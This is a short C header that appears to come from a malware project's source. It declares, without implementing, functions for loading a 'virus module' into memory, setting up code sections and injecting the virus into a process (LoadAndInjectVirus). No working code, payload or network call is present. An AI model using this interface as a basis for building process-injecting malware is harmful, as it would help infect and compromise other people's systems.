#ifndef __MEMORY_SECTIONS_H__
#define __MEMORY_SECTIONS_H__

#include "StdAfx.h"
#include "define.h"

INT32 
LoadVirusModuleSection
(HANDLE hHandle,
 PGENERAL_INFO_BLOCK sInfoBlock,
 PVOID pVirusModule,
 INT32 pVirusModuleSize,
 INT32 iExecEntryNumber,
 PVOID pUnknownSegment,
 DWORD pUnknownSegmentSize,
 PVOID *ppModuleBlock);
 
INT32 
LoadAndInjectVirus
(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader,
 PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader,
 PGENERAL_INFO_BLOCK sInfoBlock);

DWORD 
GetCodeBlockSize(void);

DWORD 
GetCodeBlock(void);

DWORD 
GetRelativeExecuteLibraryPointer(void);

DWORD 
GetRelativeAlignAddressesPointer(void);

INT32 
LoadCodeSection
(HANDLE hHandle,
PVOID pVirusModuleSection,
PVOID *pCodeBlockPointer,
PVOID *pAssemblyCodeBlocksSection);

INT32 
Setup
(LPCWSTR szDebugModuleName,
 PVOID pVirusModule,
 DWORD iVirusModuleSize,
 MODULE *hVirusModule);

#endif